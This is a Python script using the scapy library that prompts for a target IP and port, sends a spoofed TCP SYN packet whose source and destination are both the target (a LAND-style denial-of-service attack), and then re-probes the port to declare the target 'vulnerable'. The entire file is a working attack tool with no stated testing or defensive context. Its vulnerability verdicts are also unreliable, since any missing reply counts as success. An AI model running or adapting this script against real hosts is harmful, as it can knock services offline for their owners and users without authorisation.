from scapy.all import IP, TCP, sr1

def get_target_info():
    ip = input("Please enter the target's IP address (IPv4): ").strip()
    try:
        port = int(input("Please enter the port you wish to target: ").strip())
    except ValueError:
        print("Invalid port number. Please enter a valid integer.")
        exit(1)
    return ip, port

def probe(ip, port):
    # Send a SYN packet to probe the target.
    response = sr1(IP(dst=ip)/TCP(dport=port, flags='S'), timeout=10, verbose=False)
    return response is not None

def send_spoofed_packet(ip, port):
    # Send a spoofed SYN packet to the target.
    return sr1(IP(src=ip, dst=ip)/TCP(sport=port, dport=port, flags='S'), timeout=1, verbose=False)

def check_port_status(ip, port):
    # Send a SYN packet to check if the port is still open.
    response = sr1(IP(dst=ip)/TCP(dport=port, flags='S'), timeout=5, verbose=False)
    return response

def main():
    ip, port = get_target_info()

    print("\nChecking if target is online and responding...\n")
    if probe(ip, port):
        print("\nTarget is up and running... Sending spoofed packet to target...\n")
        
        send_spoofed_packet(ip, port)
        
        print("\nProbing port...\n")
        port_check_response = check_port_status(ip, port)

        if port_check_response:
            flags = port_check_response.getlayer(TCP).flags
            
            if flags == "RA":
                print("\nTarget is vulnerable. Port got closed. Received flag: RA\n")
            elif flags == "SA":
                print("\nTarget isn't vulnerable on this port because the port is still open. Received flag: SA\n")
            else:
                print("\nTarget is vulnerable. Unexpected flag received.\n")
        else:
            print("\nTarget is vulnerable. No response received, indicating the port might be closed.\n")
    else:
        print("\nExiting... Contact couldn't be established with the target.\n")

if __name__ == "__main__":
    main()
